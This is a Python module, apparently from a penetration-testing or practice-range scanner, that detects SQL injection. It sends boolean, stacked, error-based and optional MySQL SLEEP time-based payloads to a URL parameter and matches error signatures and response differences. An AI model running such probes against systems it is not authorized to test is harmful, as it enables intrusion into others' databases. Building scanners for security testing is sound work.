# modules/sql_injection.py
"""
增强版 SQL 注入检测模块（含可选 time-based 检测）
- 支持外部 payload JSON + 动态 time-based payload（MySQL SLEEP）
- time-based 由 CLI flag --enable-time 控制，阈值由 --time-threshold 控制（单位：秒）
- 如果启用 time-based，会在 boolean/stacked/error 之后额外尝试延时 payload
"""

import os
import json
import time
import requests
from typing import Optional
from difflib import SequenceMatcher

# ===== 配置 =====
DIFF_THRESHOLD = 0.85
LENGTH_DIFF_THRESHOLD = 40
TIMEOUT = 6.0  # 单个 HTTP 请求超时（秒）

SQL_ERROR_SIGS = [
    "you have an error in your sql syntax",
    "check the manual that corresponds to your mysql server version",
    "warning: mysql",
    "mysql_fetch",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "syntax error",
    "unknown column",
    "order clause",
    "mysql_num_rows()"
]

# ===== 工具函数 =====
def _similarity_ratio(a: str, b: str) -> float:
    if not a or not b:
        return 0.0
    try:
        return SequenceMatcher(None, a, b).ratio()
    except Exception:
        return 0.0

def _make_get_url(base: str, param_name: str, payload: str) -> str:
    from requests.utils import requote_uri
    sep = '&' if '?' in base else '?'
    return f"{base}{sep}{param_name}={requote_uri(payload)}"

def _make_post_data(param_name: str, payload: str) -> dict:
    return {param_name: payload, "Submit": "Submit"}

def _has_sql_error_signature(text: str) -> Optional[str]:
    if not text:
        return None
    lower_text = text.lower()
    if "unknown column" in lower_text or "order clause" in lower_text:
        return "order_by_error"
    if "syntax" in lower_text:
        return "syntax_error"
    for sig in SQL_ERROR_SIGS:
        if sig in lower_text:
            return sig
    return None

# ===== 生成 time-based payload 的帮助函数 =====
def _make_time_payloads(sleep_seconds: int = 5):
    """
    生成一组 time-based payload（MySQL SLEEP）
    返回结构化 payload 列表，包含 integer/single_quote/double_quote 形式
    例子：
      1 AND SLEEP(5)--+
      1' AND SLEEP(5)--+
      1" AND SLEEP(5)--+
    注意：部分靶场要求不同注释风格，已使用 --+ 常见风格
    """
    s = int(sleep_seconds)
    p_int = f"1 AND SLEEP({s})--+"
    p_sq = f"1' AND SLEEP({s})--+"
    p_dq = f"1\" AND SLEEP({s})--+"
    return {"integer": [p_int], "single_quote": [p_sq], "double_quote": [p_dq]}

# ===== 主扫描函数 =====
def scan(target: str, param_name: str = 'id', session: Optional[requests.Session] = None,
         enable_time: bool = False, time_threshold: float = 3.0) -> dict:
    """
    target: 目标 URL（页面基址）
    param_name: 参数名，比如 id
    session: 可选 requests.Session（携带 cookie）
    enable_time: 是否启用延时盲注检测（默认 False）
    time_threshold: 判定为 time-based 的响应时间阈值（秒）
    """
    res = {
        "name": "sql_injection",
        "target": target,
        "detected": False,
        "vulnerable_payload": None,
        "payload_category": None,
        "payload_type": None,
        "evidence": [],
        "attempts_tried": 0,
        "notes": "Enhanced: supports optional time-based detection."
    }

    requester = session if session else requests

    # 加载外部 payload JSON（error/boolean/stacked 等）
    payload_path = os.path.join(os.path.dirname(__file__), "payloads", "sql_payloads.json")
    try:
        with open(payload_path, "r", encoding="utf-8") as f:
            PAYLOAD_SETS = json.load(f)
    except Exception as e:
        res["notes"] = f"Failed to load payloads: {e}"
        return res

    # baseline 请求
    try:
        r0 = requester.get(target, timeout=TIMEOUT)
        baseline_body = r0.text or ""
        baseline_len = len(baseline_body)
    except Exception as e:
        res["notes"] = f"Baseline request failed: {e}"
        return res

    # 检测顺序： boolean -> stacked_query -> error_based
    scan_order = ["boolean_based", "stacked_query", "error_based"]

    for category in scan_order:
        subtypes = PAYLOAD_SETS.get(category, {})
        for ptype, payload_list in subtypes.items():
            for payload in payload_list:
                res["attempts_tried"] += 1
                for method in ["GET", "POST"]:
                    try:
                        url = _make_get_url(target, param_name, payload)
                        start = time.time()
                        if method == "GET":
                            r = requester.get(url, timeout=TIMEOUT)
                        else:
                            r = requester.post(target, data=_make_post_data(param_name, payload), timeout=TIMEOUT)
                        end = time.time()
                        body = r.text or ""
                        status = r.status_code
                        length = len(body)
                        ratio = _similarity_ratio(baseline_body, body)
                        diff_len = abs(length - baseline_len)
                        elapsed = round(end - start, 3)
                    except Exception as e:
                        res["evidence"].append({
                            "payload": payload,
                            "method": method,
                            "url": url,
                            "reason": "network_error",
                            "error": str(e)
                        })
                        continue

                    matched = _has_sql_error_signature(body)
                    # order_by_error：直接判定
                    if matched == "order_by_error":
                        attempt = {
                            "payload": payload,
                            "method": method,
                            "url": url,
                            "status_code": status,
                            "length": length,
                            "diff_ratio": round(ratio, 4),
                            "time": elapsed,
                            "reason": "order_by_error",
                            "matched_signature": matched
                        }
                        res["detected"] = True
                        res["vulnerable_payload"] = payload
                        res["payload_category"] = "error_based"
                        res["payload_type"] = ptype
                        res["evidence"] = [attempt]
                        return res

                    # syntax_error：二次确认（避免轻微报错被误判）
                    if matched == "syntax_error":
                        if ratio < 0.80 or diff_len > 50:
                            attempt = {
                                "payload": payload,
                                "method": method,
                                "url": url,
                                "status_code": status,
                                "length": length,
                                "diff_ratio": round(ratio, 4),
                                "time": elapsed,
                                "reason": "syntax_error_diff",
                                "matched_signature": matched
                            }
                            res["detected"] = True
                            res["vulnerable_payload"] = payload
                            res["payload_category"] = "error_based"
                            res["payload_type"] = ptype
                            res["evidence"] = [attempt]
                            return res
                        else:
                            # 轻微 syntax 提示，忽略
                            continue

                    # 内容差异（布尔型/内容差异）
                    if ratio < DIFF_THRESHOLD or diff_len > LENGTH_DIFF_THRESHOLD:
                        attempt = {
                            "payload": payload,
                            "method": method,
                            "url": url,
                            "status_code": status,
                            "length": length,
                            "diff_ratio": round(ratio, 4),
                            "time": elapsed,
                            "reason": "content_diff"
                        }
                        res["detected"] = True
                        res["vulnerable_payload"] = payload
                        res["payload_category"] = category
                        res["payload_type"] = ptype
                        res["evidence"] = [attempt]
                        return res

    # ===== 若启用 time-based，则再尝试 time-based payloads =====
    if enable_time:
        # 我们用一个稍大的 sleep 时长（例如 5s）来测试；你可通过 CLI 调整阈值
        sleep_sec = max(3, int(round(float(time_threshold) if 'time_threshold' in locals() else 5)))
        time_payloads = _make_time_payloads(sleep_sec)
        # time_payloads: {"integer": [...], "single_quote": [...], "double_quote": [...]}
        for ptype, payload_list in time_payloads.items():
            for payload in payload_list:
                res["attempts_tried"] += 1
                for method in ["GET", "POST"]:
                    try:
                        url = _make_get_url(target, param_name, payload)
                        start = time.time()
                        if method == "GET":
                            r = requester.get(url, timeout=TIMEOUT + sleep_sec)
                        else:
                            r = requester.post(target, data=_make_post_data(param_name, payload), timeout=TIMEOUT + sleep_sec)
                        end = time.time()
                        elapsed = round(end - start, 3)
                    except Exception as e:
                        res["evidence"].append({
                            "payload": payload,
                            "method": method,
                            "url": url,
                            "reason": "network_error",
                            "error": str(e)
                        })
                        continue

                    # 判断是否超过阈值（time_threshold）
                    # 这里使用传入的 time_threshold（在 CLI 中由 src.app 传入）
                    thr = float(time_threshold) if 'time_threshold' in locals() else 3.0
                    if elapsed >= thr:
                        attempt = {
                            "payload": payload,
                            "method": method,
                            "url": url,
                            "time": elapsed,
                            "reason": "time_based"
                        }
                        res["detected"] = True
                        res["vulnerable_payload"] = payload
                        res["payload_category"] = "time_based"
                        res["payload_type"] = ptype
                        res["evidence"] = [attempt]
                        return res
                    # 否则继续尝试
    # 未检测到
    return res
